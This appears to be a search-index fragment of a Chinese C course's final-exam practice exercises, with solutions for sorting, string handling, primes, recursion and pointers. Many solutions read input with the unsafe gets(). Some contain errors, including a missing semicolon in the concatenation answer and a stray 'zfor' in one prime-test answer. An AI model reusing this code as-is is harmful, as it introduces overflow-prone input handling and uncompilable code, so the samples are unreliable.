\u4e2a\u5b57\u7b26\u3002\u8981\u6c42\u5206\u522b\u7edf\u8ba1\u51fa\u5176\u4e2d\u82f1\u6587\u5927\u5199\u5b57\u6bcd\u3001\u5c0f\u5199\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u7a7a\u683c\u4ee5\u53ca\u5176\u4ed6\u5b57\u7b26\u7684\u4e2a\u6570\u3002</p> <p>\u6ce8\u610f\uff0c\u4f7f\u7528\u4e8c\u7ef4\u6570\u7ec4\u6a21\u62df\u6587\u7ae0\u7684\u4e09\u884c\u6587\u5b57\uff0c\u5e76\u4e8e\u952e\u76d8\u8f93\u5165\u4e09\u884c\u6587\u5b57\u7684\u5185\u5bb9\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\nint main () {\n    int i, j, upp, low, dig, spa, oth;\n    char text[3][80];\n    upp = low = dig = spa = oth = 0;\n    for (i = 0; i &lt; 3; i++) {\n        gets(text[i]);\n        for (j = 0; j &lt; 80 &amp;&amp; text[i][j] != '\\0'; j++) {\n            if (text[i][j] &gt;= 'A' &amp;&amp; text[i][j] &lt;= 'Z')\n                upp++;\n            else if (text[i][j] &gt;= 'a' &amp;&amp; text[i][j] &lt;= 'z')\n                low++;\n            else if (text[i][j] &gt;= '0' &amp;&amp; text[i][j] &lt;= '9')\n                dig++;\n            else if (text[i][j] == ' ')\n                spa++;\n            else\n                oth++;\n        }\n    }\n    printf(\"upper case: %d\\n\", upp);\n    printf(\"lower case: %d\\n\", low);\n    printf(\"digit     : %d\\n\", dig);\n    printf(\"space     : %d\\n\", spa);\n    printf(\"other     : %d\\n\", oth);\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#16","title":"16","text":"<p>\u5192\u6ce1\u6392\u5e8f\u4e4b\u5347\u5e8f</p> <p>\u8bf7\u7528\u7a0b\u5e8f\u5b9e\u73b0: \u8f93\u5165<code>10</code>\u4e2a\u6574\u6570, \u5bf9\u8fd9<code>10</code>\u4e2a\u6574\u6570\u8fdb\u884c\u5192\u6ce1\u6392\u5e8f, \u4f7f\u5176\u6309\u7167\u4ece\u5c0f\u5230\u5927\u7684\u987a\u5e8f\u6392\u5217, \u5e76\u5c06\u6392\u5217\u540e\u7684\u7ed3\u679c\u8f93\u51fa.</p>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#161","title":"16.1","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int arr[10] = { 0 };\n    for (int i = 0; i &lt; 10; i++) {\n        scanf(\"%d\", &amp;arr[i]);\n    }\n    for (int j = 0; j &lt; 9; j++) {\n        for (int i = 0; i &lt; 9 - j; i++) {\n            if (arr[i] &gt; arr[i + 1]) {\n                int tmp = arr[i];\n                arr[i] = arr[i + 1];\n                arr[i + 1] = tmp;\n            }\n        }\n    }\n    for (int i = 0; i &lt; 10; i++)\n    {\n        printf(\"%d \", arr[i]);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#162","title":"16.2","text":"C<pre><code>#include &lt;stdio.h&gt;\n#define N 10\n\nvoid Input(int b[N]) {\n    //\u8f93\u5165\u51fd\u6570\n    int i;\n    printf(\"\u8bf7\u8f93\u5165%d\u4e2a\u6574\u6570\uff1a\\n\",N);\n    for(i=0; i&lt;N; i++) {\n        scanf(\"%d\",&amp;b[i]);\n    }\n}\n\nvoid BubbleSort(int b[N]) {\n    //\u5192\u6ce1\u6392\u5e8f\u51fd\u6570\n    int i,j,t;\n    for(i=0; i&lt;N-1; i++) {\n        //\u5916\u5c42\u5faa\u73af\u63a7\u5236\u8d9f\u6570\n        for(j=0; j&lt;N-1-i; j++) {\n            //\u5185\u5c42\u5faa\u73af\u63a7\u5236\u6bcf\u8d9f\u7684\u6bd4\u8f83\u6b21\u6570\n            if(b[j]&gt;b[j+1]) {\n                t=b[j];\n                b[j]=b[j+1];\n                b[j+1]=t;\n            }\n        }\n    }\n}\n\nvoid Print(int b[N]) {\n    //\u8f93\u51fa\u51fd\u6570\n    int i;\n    for(i=0; i&lt;N; i++) {\n        if(i%10==0)\n            printf(\"\\n\");\n        printf(\"%6d\",b[i]);\n    }\n    printf(\"\\n\");\n}\n\nint main() {\n    int a[N];\n    Input(a);\n    printf(\"\u6392\u5e8f\u524d\uff1a\");\n    Print(a);\n    BubbleSort (a);\n    printf(\"\u6392\u5e8f\u540e\uff1a\");\n    Print(a);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#17","title":"17","text":"<p>\u6768\u8f89\u4e09\u89d2</p> <p>\u4efb\u52a1\u8981\u6c42</p> <p>\u6768\u8f89\u4e09\u89d2\uff0c\u53c8\u79f0\u8d3e\u5baa\u4e09\u89d2\u5f62\u3001\u5e15\u65af\u5361\u4e09\u89d2\u5f62\uff0c\u662f\u4e8c\u9879\u5f0f\u7cfb\u6570\u5728\u4e09\u89d2\u5f62\u4e2d\u7684\u4e00\u79cd\u51e0\u4f55\u6392\u5217\u3002\u5176\u4e2d\u524d10\u884c\u6837\u5f0f\u5982\u4e0b\uff1a</p> Text Only<pre><code>1  \n1   1 \n1   2   1\n1   3   3   1\n1   4   6   4   1\n1   5  10  10   5   1\n1   6  15  20  15   6   1\n1   7  21  35  35  21   7   1\n1   8  28  56  70  56  28   8   1\n1   9  36  84 126 126  84  36   9   1\n</code></pre> <p>\u7f16\u5199\u7a0b\u5e8f\uff0c\u8f93\u5165\u4e00\u4e2a\u6574\u6570 number\uff0c\u901a\u8fc7\u4e8c\u7ef4\u6570\u7ec4\u7684\u65b9\u5f0f\u8f93\u51fa\u6768\u8f89\u4e09\u89d2\u7684\u7b2c number \u884c\u3002</p> <p>\u5b9e\u73b0\u601d\u8def</p> <ul> <li>\u5b9a\u4e49\u4e00\u4e2a<code>100*100</code>\u7684\u6570\u7ec4</li> <li>for\u5faa\u73af\u904d\u5386\u5e76\u5b9a\u4e49\u7b2ci\u884c\u7684\u7b2ci\u4e2a\u5143\u7d20\u4ee5\u53ca\u7b2ci\u884c\u7684\u7b2c1\u4e2a\u5143\u7d20\u90fd\u4e3a1</li> <li>\u5f53\u957f\u5ea6\u5927\u4e8e2\u65f6\uff0c\u6267\u884c\u5982\u4e0b\u7b97\u6cd5</li> </ul> Text Only<pre><code>for (j = 1; j &lt;= i-1; j++)\n   arr[i][j] = arr[i-1][j-1] + arr[i-1][j];\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#171","title":"17.1","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    int arr[100][100] = {0};\n    for (int i = 0; i &lt; 100; i++)\n    {\n        arr[i][i] = 1;\n        arr[i][0] = 1;\n        if (i &gt; 1)\n        {\n            for (int j = 1; j &lt;= i - 1; j++) {\n                arr[i][j] = arr[i - 1][j - 1] + arr[i - 1][j];\n            }\n        }\n    }\n\n    int number;\n    scanf(\"%d\", &amp;number);\n    for (int i = 0; i &lt; number; i++)\n    {\n        printf(\"%d \", arr[number - 1][i]);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#172","title":"17.2","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    int length, arr[100][100], i, j;\n\n    scanf(\"%d\", &amp;length);\n\n    for (i = 0; i &lt; length; i++){\n        arr[i][i] = 1;\n        arr[i][0] = 1;\n    }\n\n    if (length &gt; 2) {\n        for (i = 2; i &lt; length; i++)\n            for (j = 1; j &lt;= i-1; j++)\n                arr[i][j] = arr[i-1][j-1] + arr[i-1][j];\n    }\n\n    for (i = 0; i &lt; length; i++) {\n        printf(\"%6d\", arr[length-1][i]);\n    }\n\n    printf(\"\\n\");\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#18","title":"18","text":"<p>\u7edf\u8ba1\u5b57\u7b26\u4e2a\u6570</p> <p>\u8bf7\u7528\u7a0b\u5e8f\u5b9e\u73b0: \u8f93\u5165\u4e00\u4e2a\u957f\u5ea6\u4e0d\u8d85\u8fc7<code>100</code>\u7684\u5b57\u7b26\u4e32<code>string</code>\uff0c\u5206\u522b\u7edf\u8ba1\u51fa\u8fd9\u4e2a\u5b57\u7b26\u4e32\u5305\u542b\u7684\u82f1\u6587\u5b57\u6bcd\u3001\u7a7a\u683c\u3001\u6570\u5b57\u548c\u5176\u4ed6\u5b57\u7b26\u7684\u4e2a\u6570\u3002</p> <p>\u63d0\u793a: \u5982\u679c<code>'A' &lt;= char &lt;= 'Z'</code>\uff0c\u5219<code>char</code>\u662f\u4e00\u4e2a\u5927\u5199\u5b57\u6bcd\u3002</p> <p>\u6ce8\u610f: C\u8bed\u8a00\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528<code>char string_name[num]</code>\u4fdd\u5b58\u5b57\u7b26\u4e32\u6570\u636e\uff0c\u5176\u4e2d<code>num</code>\u8868\u793a\u5b57\u7b26\u4e32\u7684\u6700\u5927\u957f\u5ea6\uff1b\u53ef\u4ee5\u4f7f\u7528<code>gets(string_name)</code>\u83b7\u53d6\u4ece\u952e\u76d8\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u5e76\u5c06\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u4fdd\u5b58\u5230\u53d8\u91cf<code>string_name</code>\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528<code>strlen(string_name)</code>\u83b7\u53d6\u5b57\u7b26\u4e32<code>string_name</code>\u7684\u957f\u5ea6\u3002</p>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#181","title":"18.1","text":"C<pre><code>//\u5173\u4e8e\u6b64\u9898\u7684\u8bf4\u660e\uff1a\u4f7f\u7528\u7684gets\u51fd\u6570\u5e76\u4e0d\u9002\u7528\u4e8e\u6240\u6709\u7f16\u8bd1\u73af\u5883\uff0c\u6240\u4ee5\u4f7f\u7528\u65f6\u8981\u6ce8\u610f\u3002\n//\u6ce8\u610f\u5f15\u7528\u5934\u6587\u4ef6&lt;string.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main() {\n    char string_name[101];\n\n    int letter = 0, space = 0, number = 0, other = 0;\n    //scanf(\"%s\",&amp;string);\n    //string_name[101]={string};\n    gets(string_name);\n\n    int num = strlen(string_name);\n    for (int i = 0; i &lt; num; i++)\n    {\n        if (string_name[i] &gt;= 'A' &amp;&amp; string_name[i] &lt;= 'Z')\n        {\n            letter++;\n        }\n        else if (string_name[i] &gt;= 'a' &amp;&amp; string_name[i] &lt;= 'z')\n        {\n            letter++;\n        }\n        else if (string_name[i] &gt;= '0' &amp;&amp; string_name[i] &lt;= '9')\n        {\n            number++;\n        }\n        else if (string_name[i] == ' ')\n        {\n            space++;\n        }\n        else\n        {\n            other++;\n        }\n    }\n    printf(\"letter:%d\\nspace:%d\\nnumber:%d\\nother:%d\\n\", letter, space, number, other);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#182","title":"18.2","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main () {\n  char string[100];\n  gets(string);\n  int char_num = 0, space_num = 0, number_num = 0, other_num = 0;\n  for (int i = 0; i &lt; strlen(string); i++) {\n    if (('a' &lt;= string[i] &amp;&amp; string[i] &lt;= 'z')||('A' &lt;= string[i] &amp;&amp; string[i] &lt;= 'Z')) {\n      char_num += 1;\n    } else if (string[i] == ' ') {\n      space_num += 1;\n    } else if ('0' &lt;= string[i] &amp;&amp; string[i] &lt;= '9') {\n      number_num += 1;\n    } else {\n      other_num += 1;\n    }\n  }\n  printf(\"letter\uff1a %d\\n\", char_num);\n  printf(\"space\uff1a %d\\n\", space_num);\n  printf(\"number\uff1a %d\\n\", number_num);\n  printf(\"other\uff1a %d\\n\", other_num);\n  return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#19","title":"19","text":"<p>\u5c0f\u5199\u5b57\u6bcd\u8f6c\u6362\u4e3a\u5bc6\u7801</p> <p>\u7f16\u5199\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u8f93\u5165\u4e00\u4e2a\u5c0f\u5199\u5b57\u6bcd\uff0c\u5e76\u5c06\u5b83\u8f6c\u6362\u4e3a\u5bc6\u7801\u3002\u8f6c\u6362\u89c4\u5219\uff1a\u5c06 \u2018a\u2019\u53d8\u6210\u2019Z\u2019\uff0c\u5c06 \u2018b\u2019\u53d8\u6210\u2019Y\u2019\uff0c\u5c06 \u2018c\u2019\u53d8\u6210\u2019X\u2019\u2026\u3002</p>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#191","title":"19.1","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    char low;\n\n    // \u8f93\u5165\u5c0f\u5199\u5b57\u6bcd\n    scanf(\" %c\", &amp;low);\n\n    // \u8f6c\u6362\u4e3a\u5bc6\u7801\n    char password = 'Z' - (low - 'a');\n\n    // \u8f93\u51fa\u5bc6\u7801\n    printf(\"%c\\n\", password);\n\n    return 0;\n}\n</code></pre> C<pre><code>#include &lt;stdio.h&gt;\n\nchar fun(char c);\n\nint main() {\n    char ch;\n    scanf(\"%c\", &amp;ch);\n    ch = fun(ch);\n    printf(\"%c\", ch);\n    return 0;\n}\n\nchar fun(char c) {\n    return ('Z' - (c - 'a'));\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#192","title":"19.2","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nchar fun(char c);\n\nint main() {\n    char c;\n    printf(\"\u8bf7\u8f93\u5165\u4e00\u4e2a\u5c0f\u5199\u5b57\u6bcd\uff1a\");\n    scanf(\"%c\",&amp;c);\n    c=fun(c);\n    printf(\"%c\\n\",c);\n    return 0;\n}\n\nchar fun(char c) {\n    char c1;\n    c1='z'-(c-'a')-32;\n    return c1;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#20","title":"20","text":"<p>\u8fde\u63a5\u4e24\u5b57\u7b26\u4e32\u7684\u51fd\u6570</p> <p>\u5728\u51fd\u6570\u4e2d\u5c06\u4e24\u4e2a\u5b57\u7b26\u4e32<code>string1, string2</code>\u8fde\u63a5\u6210\u4e00\u4e2a\u5b57\u7b26\u4e32<code>string</code>\u3002</p> <p>\u51fd\u6570\u5b9a\u4e49</p> Text Only<pre><code>int concatenate (char string1[], char string2[], char string[]);\n</code></pre> <p>\u53c2\u6570\u8bf4\u660e</p> <p>\u53c2\u6570 string1\u3001string2\u3001string \u5747\u662f\u5b57\u7b26\u4e32\uff0c\u5728\u51fd\u6570\u4e2d\u5c06 string1 \u548c string2 \u8fde\u63a5\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32 string\uff0c\u4e14 string1 \u5728 string2 \u524d\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\nint concatenate(char string1[], char string2[], char string[]) {\n    int i, j;\n    for (i = 0; string1[i] != '\\0'; i++) {\n        string[i] = string1[i];\n    }\n    for (j = 0; string2[j] != '\\0'; j++) {\n        string[i + j] = string2[j];\n    }\n    string[i + j] = '\\0'\n}\n\nint main() {\n    char string1[100], string2[100], string[100];\n\n    //scanf(\"%s\", string1);\n    //scanf(\"%s\", string2);\n\n    //fgets(string1, sizeof(string1), stdin);\n    //fgets(string2, sizeof(string2), stdin);\n\n    gets(string1);\n    gets(string2);\n\n    concatenate(string1, string2, string);\n    printf(\"%s\\n\", string);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#21_1","title":"21","text":"<p>\u53cd\u5e8f\u5b58\u653e\u5b57\u7b26\u4e32\u7684\u51fd\u6570</p> <p>\u5728\u51fd\u6570\u4e2d\u5c06\u5b57\u7b26\u4e32\u6309\u53cd\u5e8f\u5b58\u653e\u3002</p> <p>\u51fd\u6570\u5b9a\u4e49</p> Text Only<pre><code>int inverse (char str[]);\n</code></pre> <p>\u53c2\u6570\u8bf4\u660e</p> <p>\u53c2\u6570 str \u662f\u5b57\u7b26\u4e32\uff0c\u5728\u51fd\u6570\u4e2d\u9700\u8981\u5c06\u8be5\u5b57\u7b26\u4e32\u8fdb\u884c\u53cd\u5e8f\u5b58\u653e\u3002</p>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#211","title":"21.1","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nvoid inverse(char str[]);\n\nint main() {\n    char inputString[100];\n\n    // \u8f93\u5165\u5b57\u7b26\u4e32\n    fgets(inputString, sizeof(inputString), stdin);\n\n    // \u8c03\u7528\u51fd\u6570\u53cd\u5e8f\u5b58\u653e\u5b57\u7b26\u4e32\n    inverse(inputString);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\" %s\\n\", inputString);\n\n    return 0;\n}\n\n// \u53cd\u5e8f\u5b58\u653e\u5b57\u7b26\u4e32\u7684\u51fd\u6570\nvoid inverse(char str[]) {\n    int length = strlen(str);\n\n    // \u4f7f\u7528\u4e24\u4e2a\u6307\u9488\u8fdb\u884c\u53cd\u5e8f\u4ea4\u6362\n    int start = 0;\n    int end = length - 1;\n\n    while (start &lt; end) {\n        // \u4ea4\u6362\u5b57\u7b26\n        char temp = str[start];\n        str[start] = str[end];\n        str[end] = temp;\n\n        // \u79fb\u52a8\u6307\u9488\n        start++;\n        end--;\n    }\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#212","title":"21.2","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint inverse (char str[]) {\n    char t;\n    int i, j;\n    for (i = 0, j = strlen(str); i &lt; strlen(str) / 2; i++, j--) {\n        t = str[i];\n        str[i] = str[j - 1];\n        str[j - 1] = t;\n    }\n}\n\nint main () {\n    char str[100];\n    scanf(\"%s\", str);\n    inverse(str);\n    printf(\"%s\\n\", str);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#22_1","title":"22","text":"<p>\u5224\u65ad\u7d20\u6570\u7684\u51fd\u6570</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u8bf7\u5b8c\u5584\u51fd\u6570<code>isPrime</code>\u3002<code>isPrime</code>\u51fd\u6570\u7684\u529f\u80fd\u662f\u5224\u65ad\u4e00\u4e2a\u6570\u662f\u5426\u4e3a\u7d20\u6570\uff0c\u5982\u679c\u662f\u7d20\u6570\uff0c\u5219\u8f93\u51fa<code>Yes</code>\uff0c\u4e0d\u662f\u7d20\u6570\u5219\u8f93\u51fa<code>No</code>\u3002</p> <p>\u6ce8\u610f\uff1a\u8bf7\u4e0d\u8981\u4fee\u6539 main \u51fd\u6570\u4e2d\u7684\u4ee3\u7801\u3002</p> <p>\u53c2\u6570\u8bf4\u660e</p> <ul> <li>\u53c2\u6570 num \u662f\u6574\u6570\uff0c\u5728\u51fd\u6570\u4e2d\u9700\u8981\u5224\u65ad\u8be5\u6570\u662f\u5426\u4e3a\u7d20\u6570\u3002</li> </ul>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#221","title":"22.1","text":"C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nvoid isPrime(int num);\n\nint main() {\n    int num;\n\n    // \u8f93\u5165\u6574\u6570\n    scanf(\"%d\", &amp;num);\n\n    // \u8c03\u7528\u51fd\u6570\u5224\u65ad\u7d20\u6570\n    isPrime(num);\n\n    return 0;\n}\n\n// \u5224\u65ad\u7d20\u6570\u7684\u51fd\u6570\nvoid isPrime(int num) {\n    if (num &lt; 2) {\n        printf(\"No\\n\"); // \u5c0f\u4e8e2\u7684\u6570\u4e0d\u662f\u7d20\u6570\n        return;\n    }\n\n    zfor (int i = 2; i * i &lt;= num; i++) {\n        if (num % i == 0) {\n            printf(\"No\\n\"); // \u80fd\u591f\u88ab\u6574\u9664\uff0c\u4e0d\u662f\u7d20\u6570\n            return;\n        }\n    }\n\n    printf(\"Yes\\n\"); // \u6ca1\u6709\u627e\u5230\u80fd\u591f\u6574\u9664\u7684\u56e0\u5b50\uff0c\u662f\u7d20\u6570\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#222","title":"22.2","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint isPrime (int num) {\n    if (num &lt; 2) {\n        printf(\"No\\n\");\n    }\n    else if (num == 2 || num == 3) {\n        printf(\"Yes\\n\");\n    }\n    else {\n        int flag = 1, i;\n        for (i = 2; i &lt;= num / 2 &amp;&amp; flag == 1; i++)\n            if (num % i == 0)\n                flag = 0;\n        if (flag)\n            printf(\"Yes\\n\");\n        else\n            printf(\"No\\n\");\n    }\n    return 0;\n}\n\nint main () {\n    int num = 11;\n    isPrime(num);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#23","title":"23","text":"<p>\u8ba1\u7b97\u5e74\u9f84</p> <p>\u6709 n \u4e2a\u4eba\u56f4\u5750\u5728\u4e00\u8d77\uff0c\u95ee\u7b2c n \u4e2a\u4eba\u591a\u5927\u5e74\u7eaa\uff0c\u4ed6\u8bf4\u6bd4\u7b2c n-1 \u4e2a\u4eba\u5927 2 \u5c81\uff1b\u95ee\u7b2c n-1 \u4e2a\u4eba\uff0c\u4ed6\u8bf4\u6bd4\u7b2c n-2 \u4e2a\u4eba\u5927 2 \u5c81\uff1b\u2026\u2026\u2026\u2026\uff0c\u4ee5\u6b64\u7c7b\u63a8\uff0c\u95ee\u7b2c 2 \u4e2a\u4eba\uff0c\u4ed6\u8bf4\u6bd4\u7b2c 1 \u4e2a\u4eba\u5927 2 \u5c81\u3002\u7b2c 1 \u4e2a\u4eba\u8bf4\u81ea\u5df1 10 \u5c81\u3002</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u8bf7\u5b8c\u5584\u51fd\u6570<code>age</code>\u3002<code>age</code>\u51fd\u6570\u7684\u529f\u80fd\u662f\u7528\u9012\u5f52\u6cd5\u8ba1\u7b97\u5e76\u8f93\u51fa\u7b2c n \u4e2a\u4eba\u7684\u5e74\u9f84\u3002</p> <p>\u6ce8\u610f\uff1a\u8bf7\u4e0d\u8981\u4fee\u6539 main \u51fd\u6570\u4e2d\u7684\u4ee3\u7801\u3002</p> <p>\u53c2\u6570\u8bf4\u660e</p> <ul> <li><code>n</code>\uff0c\u6574\u6570\uff0c\u8868\u793a\u4eba\u6570\u3002</li> </ul> C<pre><code>#include &lt;stdio.h&gt;\n\nint age (int n) {\n    if (n == 1) {\n        return 10;\n    } else {\n        return age(n - 1) + 2;\n    }\n}\n\nint main () {\n    int n;\n    scanf(\"%d\", &amp;n);\n    int ages = age(n);\n    printf(\"%d\\n\", ages);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#24","title":"24","text":"<p>\u6700\u5c0f\u516c\u500d\u6570</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u8bf7\u5b8c\u5584\u51fd\u6570<code>common_multiple</code>\u3002<code>common_multiple</code>\u51fd\u6570\u7684\u529f\u80fd\u662f\u8ba1\u7b97\u5e76\u8fd4\u56de\u4e24\u4e2a\u6574\u6570\u7684\u6700\u5c0f\u516c\u500d\u6570\u3002</p> <p>\u6ce8\u610f\uff1a\u8bf7\u4e0d\u8981\u4fee\u6539 main \u51fd\u6570\u4e2d\u7684\u4ee3\u7801\u3002</p> <p>\u53c2\u6570\u8bf4\u660e</p> <ul> <li><code>number1</code>, <code>number2</code>, \u4e24\u4e2a\u6574\u6570\u3002</li> </ul>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#241","title":"24.1","text":"C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint common_multiple(int number1, int number2);\n\nint main() {\n    int number1, number2;\n\n    // \u8f93\u5165\u4e24\u4e2a\u6574\u6570\n    scanf(\"%d %d\", &amp;number1, &amp;number2);\n\n    // \u8c03\u7528\u51fd\u6570\u8ba1\u7b97\u6700\u5c0f\u516c\u500d\u6570\n    int result = common_multiple(number1, number2);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"%d\\n\", result);\n\n    return 0;\n}\n\n// \u8ba1\u7b97\u6700\u5c0f\u516c\u500d\u6570\u7684\u51fd\u6570\nint common_multiple(int number1, int number2) {\n    int max = (number1 &gt; number2) ? number1 : number2;\n\n    while (1) {\n        if (max % number1 == 0 &amp;&amp; max % number2 == 0) {\n            return max;\n        }\n        max++;\n    }\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#242","title":"24.2","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint common_multiple (int number1, int number2) {\n    int multiple;\n    for (multiple = 1; ; multiple++) {\n        if (multiple % number1 == 0 &amp;&amp; multiple % number2 == 0) {\n            break;\n        }\n    }\n    return multiple;\n}\n\nint main () {\n    int multiple, number1 = 24, number2 = 16;\n    multiple = common_multiple(number1, number2);\n    printf(\"%d\", multiple);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#25","title":"25","text":"<p>\u4f7f\u7528\u6307\u9488\u5b9e\u73b0\u5b57\u7b26\u4e32\u590d\u5236</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u7f16\u5199\u51fd\u6570void StrCopy(char ps1, char ps2)\uff0c\u5176\u529f\u80fd\uff1a\u628a\u5b57\u7b26\u4e32ps2\u7684\u5185\u5bb9\u590d\u5236\u5230\u5b57\u7b26\u4e32ps1\u4e2d\uff0c\u8981\u6c42\u4e0d\u80fd\u4f7f\u7528strcpy\u51fd\u6570\u3002\u4e3b\u51fd\u6570\u8f93\u5165\u4e24\u4e2a\u5b57\u7b26\u4e32\u548c\u8c03\u7528StrCopy\u51fd\u6570\u8f93\u51fa\u590d\u5236\u540eps1\u7684\u5b57\u7b26\u4e32\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#define N 30\n\nvoid StrCopy(char* ps1, char* ps2) {\n    while (*ps2) {\n        *ps1++ = *ps2++;\n    }\n    *ps1 = '\\0';\n}\n\nint main() {\n    char str1[N], str2[N];\n\n    fgets(str1, N, stdin);\n    fgets(str2, N, stdin);\n    //  scanf(\"%s%s\", str1, str2);\n\n    StrCopy(str1, str2);\n    printf(\"\u590d\u5236\u540e\u7684\u5b57\u7b26\u4e32\u4e3a\uff1a\\n\");\n    //  puts(str1);\n    printf(\"%s\", str1);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#26","title":"26","text":"<p>\u4f7f\u7528\u6307\u9488\u5b9e\u73b0\u5220\u9664\u6570\u7ec4\u4e2d\u6307\u5b9a\u5143\u7d20</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u7f16\u5199\u4e00\u4e2a\u51fd\u6570<code>void Delete(int *a,int i)</code>\uff0c\u7528\u4e8e\u5b9e\u73b0\u5220\u9664\u6570\u7ec4a\u4e2d\u7b2ci\u4e2a\u5143\u7d20\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#define N 10\n\nvoid Delete(int* a, int i) {\n    for (; i &lt; N - 1; i++) {\n        *(a + i) = *(a + i + 1);\n    }\n}\n\nint main() {\n    int a[N], i, n;\n\n    printf(\"\u8bf7\u8f93\u5165%d\u4e2a\u6574\u6570:\", N);\n    for (i = 0; i &lt; N; i++) {\n        scanf(\"%d\", &amp;a[i]);\n    }\n\n    printf(\"\u8bf7\u8f93\u5165\u5220\u9664\u6570\u7ec4\u4e2d\u7b2c\u51e0\u4e2a\u5143\u7d20\uff1a\");\n    scanf(\"%d\", &amp;n);\n\n    Delete(a, n);\n\n    printf(\"\u5220\u9664\u6570\u7ec4\u4e2d\u7b2c%d\u4e2a\u5143\u7d20\u540e\u7684\u6570\u636e\u4e3a\uff1a\\n\", n);\n    for (i = 0; i &lt; N - 1; i++) {\n        printf(\"%d \", a[i]);\n    }\n\n    printf(\"\\n\");\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#27","title":"27","text":"<p>\u7528\u6307\u9488\u6c42\u5e73\u5747\u6210\u7ee9</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a 